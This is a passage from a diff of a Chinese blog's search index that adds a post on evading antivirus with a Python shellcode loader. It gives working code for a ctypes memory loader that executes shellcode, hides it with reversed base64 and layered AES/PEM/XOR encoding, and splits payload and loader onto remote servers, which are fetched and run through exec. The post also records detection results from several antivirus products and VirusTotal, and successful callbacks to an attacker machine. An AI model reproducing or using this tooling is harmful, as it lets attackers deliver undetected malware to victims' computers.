ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line"># 等待上面创建的线程运行完</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
+
+<p>这次使用安全软件检测，发现检出问题相对于不加任何免杀技术报警发生了变化，这次是爆出关于python的shellloader</p>
+<p><img src="/image-20240613201620740-17390843917359.png" alt="image-20240613201620740"></p>
+<h3 id="shellcodeloader编码"><a href="#shellcodeloader编码" class="headerlink" title="shellcodeloader编码"></a>shellcodeloader编码</h3><p>根据上述爆出的错误，说明防病毒软件检出了shellcodeloader</p>
+<p>那么下一步就是需要针对shellcodeloader做处理，降低检出率</p>
+<p>思路：将shellcodeloader使用切片的方式，对shellcodeloader进行反转（python切片，从右到左），然后进行base64编码</p>
+<p>在上述加密脚本中创建shellcodeloader变量</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># shellcode加载器</span><br><span class="line">shell_loader = b&#x27;&#x27;&#x27;</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64</span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(buf), 0x3000, 0x40)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(buf), len(buf))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -1)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>修正main方法，输出shellcode的同时输出编码后的shellcodeloader</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def main(shellcode):</span><br><span class="line">    return (shellcode_encode(shellcode), base64.b64encode(shell_loader[::-1]))</span><br></pre></td></tr></table></figure>
+
+<p>在主方法中，调用main方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shellcode, shell_loader = main(buf)</span><br></pre></td></tr></table></figure>
+
+<p>在上述解密脚本中增加shellcodeloader变量，存储编码后的shellcodeloader变量</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell_load = b&#x27;CikxLSAsZWxkbmFoKHRjZWpiT2VsZ25pU3JvRnRpYVcuMjNsZW5yZWsubGxkbml3LnNlcHl0YwopMCAsMCAsMCAsKWVnYXB4d3IoNDZ0bml1X2Muc2VweXRjICwwICwwKGRhZXJoVGV0YWVyQy4yM2xlbnJlay5sbGRuaXcuc2VweXRjID0gZWxkbmFoCikpZnViKG5lbCAsKWZ1YihyZWZmdWJfZ25pcnRzX2V0YWVyYy5zZXB5dGMgLCllZ2FweHdyKDQ2dG5pdV9jLnNlcHl0Yyh5cm9tZU1ldm9NbHRSLjIzbGVucmVrLmxsZG5pdy5zZXB5dGMKKTA0eDAgLDAwMDN4MCAsKWZ1YihuZWwgLDAoY29sbEFsYXV0cmlWLjIzbGVucmVrLmxsZG5pdy5zZXB5dGMgPSBlZ2FweHdyCjQ2dG5pdV9jLnNlcHl0Yz1lcHl0c2VyLmNvbGxBbGF1dHJpVi4yM2xlbnJlay5sbGRuaXcuc2VweXRjCg==&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>使用exec方法运行shellcodeloader</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec(base64.b64decode(shell_load)[::-1].decode())</span><br></pre></td></tr></table></figure>
+
+<p>使用防病毒软件测试，此时，针对于执行shellcode的py文件防病毒软件已经不会报警了</p>
+<h4 id="py文件测试"><a href="#py文件测试" class="headerlink" title="py文件测试"></a>py文件测试</h4><p>火绒</p>
+<p><img src="/image-20240613203111150-173908439173510.png" alt="image-20240613203111150"></p>
+<p>windows Defender</p>
+<p><img src="/image-20240613205912101-173908439173511.png" alt="image-20240613205912101"></p>
+<p>360</p>
+<p><img src="/image-20240613212151292-173908439173512.png" alt="image-20240613212151292"></p>
+<p>腾讯电脑管家</p>
+<p><img src="/image-20240613212213677-173908439173513.png" alt="image-20240613212213677"></p>
+<p>VIRUSTOTAL：<code>https://www.virustotal.com/gui/home/upload</code></p>
+<p><img src="/image-20240613210054943-173908439173514.png" alt="image-20240613210054943"></p>
+<p>微步在线：<code>https://s.threatbook.com/</code></p>
+<p><img src="/image-20240613210045834-173908439173515.png" alt="image-20240613210045834"></p>
+<h6 id="上线测试"><a href="#上线测试" class="headerlink" title="上线测试"></a>上线测试</h6><p>运行py文件</p>
+<p><img src="/image-20240613215659882-173908439173516.png" alt="image-20240613215659882"></p>
+<p>上线成功</p>
+<p><img src="/image-20240613215722459-173908439173518.png" alt="image-20240613215722459"></p>
+<h4 id="exe文件测试"><a href="#exe文件测试" class="headerlink" title="exe文件测试"></a>exe文件测试</h4><p>将其打包成exe就会报警，即使采用了不加-w参数</p>
+<p>火绒检测</p>
+<p><img src="/image-20240613204415840-173908439173517.png" alt="image-20240613204415840"></p>
+<p>windows Defender</p>
+<p>加上-w参数能够扫描到，不加上-w参数扫描不到</p>
+<p><img src="/image-20240613205443924-173908439173522.png" alt="image-20240613205443924"></p>
+<p>360</p>
+<p>加不加-w参数均会报警</p>
+<p><img src="/image-20240613212352370-173908439173519.png" alt="image-20240613212352370"></p>
+<p>腾讯电脑管家</p>
+<p>加不加-w参数均不会报警</p>
+<p><img src="/image-20240613212321050-173908439173520.png" alt="image-20240613212321050"></p>
+<p>VIRUSTOTAL：<code>https://www.virustotal.com/gui/home/upload</code></p>
+<p>加-w参数检出19个</p>
+<p><img src="/image-20240613204520455-173908439173521.png" alt="image-20240613204520455"></p>
+<p>不加-w参数检出13个</p>
+<p><img src="/image-20240613205144509-173908439173523.png" alt="image-20240613205144509"></p>
+<p>微步在线：<code>https://s.threatbook.com/</code></p>
+<p>加-w参数检出5个</p>
+<p><img src="/image-20240613204711772-173908439173524.png" alt="image-20240613204711772"></p>
+<p>不加-w参数检出3个</p>
+<p><img src="/image-20240613205125202-173908439173525.png" alt="image-20240613205125202"></p>
+<h5 id="上线测试-1"><a href="#上线测试-1" class="headerlink" title="上线测试"></a>上线测试</h5><p><img src="/image-20240613215914043-173908439173527.png" alt="image-20240613215914043"></p>
+<h3 id="shellcode和shellcodeloader分离"><a href="#shellcode和shellcodeloader分离" class="headerlink" title="shellcode和shellcodeloader分离"></a>shellcode和shellcodeloader分离</h3><p>上述的py的检出率基本为0，但是打包成exe后检出率惨不忍睹，使用分离免杀技术针对此问题进行解决</p>
+<p>思路：将加密后的shellcode和shellcodeloader上传到服务器上，通过request请求url方式获取shellcode和shellcodeloader内容，然后使用exec函数运行shellcodeloader</p>
+<p>因为上述设计的解密脚本集解密、分配内存为一体，所以我们定义一个变量将解密脚本整个文件内容进行加密</p>
+<p>创建encrypt.py文件，用于将加密后的shellcode写入a.txt中，同时输出编码后的shellcodeloader</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">import binascii</span><br><span class="line">import ctypes</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.IO import PEM</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># shellcode</span><br><span class="line">buf = b&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># shellcode加载器</span><br><span class="line">shell_loader = b&#x27;&#x27;&#x27;</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64</span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(buf), 0x3000, 0x40)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(buf), len(buf))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -1)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"># AES加密密钥（128位/192位/256位---&gt;16byte/24byte/32byte）</span><br><span class="line">key = b&#x27;4d65017f65d72aada5d1ab08d5c4bd18&#x27;</span><br><span class="line"># AES初始化向量（IV）</span><br><span class="line">iv = b&#x27;7d2d3e0bb1642d52&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">AES加密算法(CBC)</span><br><span class="line">采用CBC模式，相同的明文块在不同位置得到不同密文块</span><br><span class="line">将明文以128位分成组，然后利用使用初始化向量（IV）、加密算法和密钥进行加密</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">def aes_encode(shellcode):</span><br><span class="line">    a = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    # 填充明文</span><br><span class="line">    b = a.encrypt(pad(shellcode, 32))</span><br><span class="line">    # byte转16</span><br><span class="line">    return binascii.b2a_hex(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">byte转16</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">def b_to_a(shellcode):</span><br><span class="line">    return binascii.b2a_hex(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">base64编码</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">def b64_encode(shellcode):</span><br><span class="line">    return base64.b64encode(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">PEM加密</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">def PEM_encode(shellcode):</span><br><span class="line">    # PEM.encode(需要加密的数据, 指定名称, 指定密钥)</span><br><span class="line">    shellcode = PEM.encode(shellcode, &#x27;&#x27;, passphrase=b&#x27;shellcode&#x27;)</span><br><span class="line">    return shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">异或</span><br><span class="line">把每个字符转成ASCII值与678进行异或</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">def shellcode_xor(shellcode):</span><br><span class="line">    xor_code = &#x27;&#x27;</span><br><span class="line">    for i in shellcode:</span><br><span class="line">        i = ord(i) ^ 678</span><br><span class="line">        xor_code += str(i) + &#x27;_&#x27;</span><br><span class="line">    # 去掉最后一个_</span><br><span class="line">    return xor_code[:-1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">shellcode加密算法</span><br><span class="line">先把shellcode转为str，然后进行base64编码+AES+PEM+xor</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">def shellcode_encode(shellcode):</span><br><span class="line">    return shellcode_xor(PEM_encode(aes_encode(b64_encode(b_to_a(shellcode)))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">调用shellcode加密算法，对shellcode进行加密</span><br><span class="line">对shellcodeloader进行反转（python切片，从右到左），然后进行base64编码</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">def main(shellcode):</span><br><span class="line">    return (shellcode_encode(shellcode), base64.b64encode(shell_loader[::-1]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    shellcode, shell_loader = main(buf)</span><br><span class="line">    print(&quot;shell_loader为:&quot;)</span><br><span class="line">    print(shell_loader)</span><br><span class="line">    with open(&#x27;a.txt&#x27;, mode=&#x27;w&#x27;) as f1:</span><br><span class="line">        f1.write(shellcode)</span><br></pre></td></tr></table></figure>
+
+<p>然后创建loader.py脚本，将整个解密脚本内容充当变量，最后将编码后的数据写入b.txt中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">test = b&#x27;&#x27;&#x27;</span><br><span class="line">import base64</span><br><span class="line">import binascii</span><br><span class="line">import ctypes</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.IO import PEM</span><br><span class="line"></span><br><span class="line"># 加密后的shellcodeloader</span><br><span class="line">shell_load = b&#x27;CikxLSAsZWxkbmFoKHRjZWpiT2VsZ25pU3JvRnRpYVcuMjNsZW5yZWsubGxkbml3LnNlcHl0YwopMCAsMCAsMCAsKWVnYXB4d3IoNDZ0bml1X2Muc2VweXRjICwwICwwKGRhZXJoVGV0YWVyQy4yM2xlbnJlay5sbGRuaXcuc2VweXRjID0gZWxkbmFoCikpZnViKG5lbCAsKWZ1YihyZWZmdWJfZ25pcnRzX2V0YWVyYy5zZXB5dGMgLCllZ2FweHdyKDQ2dG5pdV9jLnNlcHl0Yyh5cm9tZU1ldm9NbHRSLjIzbGVucmVrLmxsZG5pdy5zZXB5dGMKKTA0eDAgLDAwMDN4MCAsKWZ1YihuZWwgLDAoY29sbEFsYXV0cmlWLjIzbGVucmVrLmxsZG5pdy5zZXB5dGMgPSBlZ2FweHdyCjQ2dG5pdV9jLnNlcHl0Yz1lcHl0c2VyLmNvbGxBbGF1dHJpVi4yM2xlbnJlay5sbGRuaXcuc2VweXRjCg==&#x27;</span><br><span class="line"></span><br><span class="line">key = b&#x27;4d65017f65d72aada5d1ab08d5c4bd18&#x27;</span><br><span class="line">iv = b&#x27;7d2d3e0bb1642d52&#x27;</span><br><span class="line"></span><br><span class="line">def aes_decode(shellcode):</span><br><span class="line">    a = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    shellcode = binascii.a2b_hex(shellcode)</span><br><span class="line">    shellcode = unpad(a.decrypt(shellcode), 32)</span><br><span class="line">    return shellcode</span><br><span class="line"></span><br><span class="line">def a_to_b(shellcode):</span><br><span class="line">    return binascii.a2b_hex(shellcode)</span><br><span class="line"></span><br><span class="line">def b64decode(shellcode):</span><br><span class="line">    return base64.b64decode(shellcode)</span><br><span class="line"></span><br><span class="line">def PEM_decode(shellcode):</span><br><span class="line">    shellcode = PEM.decode(shellcode, passphrase=b&#x27;shellcode&#x27;)</span><br><span class="line">    return shellcode</span><br><span class="line"></span><br><span class="line">def shellcode_xor_decode(shellcode):</span><br><span class="line">    shellcode = shellcode.split(&#x27;_&#x27;)</span><br><span class="line">    xor_code = &#x27;&#x27;</span><br><span class="line">    for i in shellcode:</span><br><span class="line">        i = int(i) ^ 678</span><br><span class="line">        xor_code += chr(i)</span><br><span class="line">    return xor_code</span><br><span class="line"></span><br><span class="line">def main(shellcode):</span><br><span class="line">    return a_to_b(b64decode(aes_decode(PEM_decode(shellcode_xor_decode(shellcode))[0])))</span><br><span class="line"></span><br><span class="line">buf = main(buf)</span><br><span class="line">exec(base64.b64decode(shell_load)[::-1])</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">b = base64.b64encode(test[::-1]).decode(&#x27;utf-8&#x27;)</span><br><span class="line">with open(&#x27;b.txt&#x27;, mode=&#x27;w&#x27;) as f1:</span><br><span class="line">    f1.write(b)</span><br></pre></td></tr></table></figure>
+
+<p>最后考虑的就是如何调用服务器上的资源了，定义play.py文件，用于生成请求，从a.txt和b.txt中获得shellcode和shellcodeloader，并使用exec方法运行，在b.txt解码后会用到文件头中定义的库，所以提前定义好引用的库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import binascii</span><br><span class="line">import ctypes</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.IO import PEM</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = requests.get(&#x27;http://192.168.125.10/a.txt&#x27;)</span><br><span class="line">buf = a.text</span><br><span class="line">print(buf)</span><br><span class="line">b = requests.get(&#x27;http://192.168.125.20/b.txt&#x27;)</span><br><span class="line">exec(base64.b64decode(b.content)[::-1].decode())</span><br></pre></td></tr></table></figure>
+
+<p>打包成exe，实测不要在encry.py和loader.py同级打包，好像会将其它信息打包在exe中？导致检出率显著提高</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyinstaller -F -w play.py</span><br><span class="line">pyinstaller -F play.py</span><br></pre></td></tr></table></figure>
+
+<h4 id="防病毒软件测试"><a href="#防病毒软件测试" class="headerlink" title="防病毒软件测试"></a>防病毒软件测试</h4><p>windows Defender</p>
+<p>加不加-w参数均扫不到</p>
+<p><img src="/image-20240613212651442-173908439173526.png" alt="image-20240613212651442"></p>
+<p>火绒</p>
+<p>加不加-w参数均扫不到</p>
+<p><img src="/image-20240613212749349-173908439173528.png" alt="image-20240613212749349"></p>
+<p>360</p>
+<p>加-w参数被扫描到，不加-w参数不会被扫描到</p>
+<p><img src="/image-20240613214905976-173908439173530.png" alt="image-20240613214905976"></p>
+<p>腾讯电脑管家</p>
+<p>加不加-w参数均扫不到</p>
+<p><img src="/image-20240613212920626-173908439173529.png" alt="image-20240613212920626"></p>
+<p>VIRUSTOTAL：<code>https://www.virustotal.com/gui/home/upload</code></p>
+<p>加上-w参数检出率16个</p>
+<p><img src="/image-20240613215026944-173908439173631.png" alt="image-20240613215026944"></p>
+<p>不加-w参数检出率为12</p>
+<p><img src="/image-20240613215228145-173908439173632.png" alt="image-20240613215228145"></p>
+<p>微步在线：<code>https://s.threatbook.com/</code></p>
+<p>加-w参数检出率4个，评估恶意</p>
+<p><img src="/image-20240613215118582-173908439173634.png" alt="image-20240613215118582"></p>
+<p>不加-w参数检出率2，评估恶意</p>
+<p><img src="/image-20240613215522323-173908439173633.png" alt="image-20240613215522323"></p>
+<h4 id="上线测试-2"><a href="#上线测试-2" class="headerlink" title="上线测试"></a>上线测试</h4><p>运行exe文件，均可上线kali（攻击机）</p>
+<p><img src="/image-20240613214952975-173908439173635.png" alt="image-20240613214952975"></p>
+]]></content>
+      <categories>
+        <category>免杀</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>分离免杀</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>博客搭建史</title>
     <url>/2021/10/01/Welcome/</url>
     <content><![CDATA[<h2 id="搭建博客"><a href="#搭建博客" class="headerlink" title="搭建博客"></a>搭建博客</h2><p>环境搭建——–&gt;<a href="https://blog.csdn.net/weixin_45019350/article/details/121901433">Hexo-零基础搭建个人博客(详解)_hexo博客-CSDN博客</a></p>
